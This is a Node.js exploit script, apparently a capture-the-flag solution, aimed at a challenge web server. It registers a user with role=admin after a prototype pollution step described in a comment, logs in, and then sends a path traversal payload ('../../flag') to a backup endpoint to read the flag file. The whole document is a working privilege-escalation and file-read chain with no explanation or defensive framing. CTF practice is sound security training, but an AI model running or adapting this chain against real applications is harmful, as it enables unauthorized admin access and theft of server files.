
const http = require('http');
const querystring = require('querystring');

// Step 1: poison already done (Object.prototype.role = admin)
// Step 2: register new user WITH role=admin, so no matter what, it will be admin!

const postData = querystring.stringify({
  "username": "lasttryadmin",
  "role": "admin"
});

const opts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/register',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(postData)
  }
};

console.log("Registering user with role=admin...");
const req = http.request(opts, (res) => {
  let body = '';
  res.on('data', chunk => body += chunk);
  res.on('end', () => {
    console.log("Registration done:");
    console.log(body);
    let match = body.match(/<span.*?>([a-f0-9]+)<\/span>/);
    if (match) {
      let uid = match[1];
      console.log(`\nGot UID: ${uid}, login...`);
      loginAndCheck(uid);
    }
  });
});

req.on('error', err => console.error(err));
req.write(postData);
req.end();

function loginAndCheck(uid) {
  const loginData = querystring.stringify({uid: uid});
  const loginOpts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/login',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(loginData)
    }
  };

  const req = http.request(loginOpts, (res) => {
    const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
    console.log("Logged in, check profile...");
    const profileData = JSON.stringify({uid: uid});
    const profileOpts = {
      hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
      port: 80,
      path: '/api/profile',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(profileData),
        'Cookie': cookie
      }
    };

    const profileReq = http.request(profileOpts, (profileRes) => {
      let body = '';
      profileRes.on('data', chunk => body += chunk);
      profileRes.on('end', () => {
        console.log("\nProfile:");
        console.log(body);
        try {
          const json = JSON.parse(body);
          console.log("\nRole:", json.role);
          if (json.role === 'admin') {
            console.log("\n🎉 FINALLY! Got admin! Getting flag...");
            const flagData = querystring.stringify({file: '../../flag'});
            const flagOpts = {
              hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
              port: 80,
              path: '/api/backup',
              method: 'POST',
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(flagData),
                'Cookie': cookie
              }
            };
            const flagReq = http.request(flagOpts, (flagRes) => {
              let flagBody = '';
              flagRes.on('data', chunk => flagBody += chunk);
              flagRes.on('end', () => {
                console.log("\n🏁 🏁 🏁 FINAL FLAG:");
                console.log(flagBody);
              });
            });
            flagReq.write(flagData);
            flagReq.end();
          }
        } catch(e) {
          console.log("Error", e);
        }
      });
    });
    profileReq.write(profileData);
    profileReq.end();
  });

  req.on('error', err => console.error(err));
  req.write(loginData);
  req.end();
}
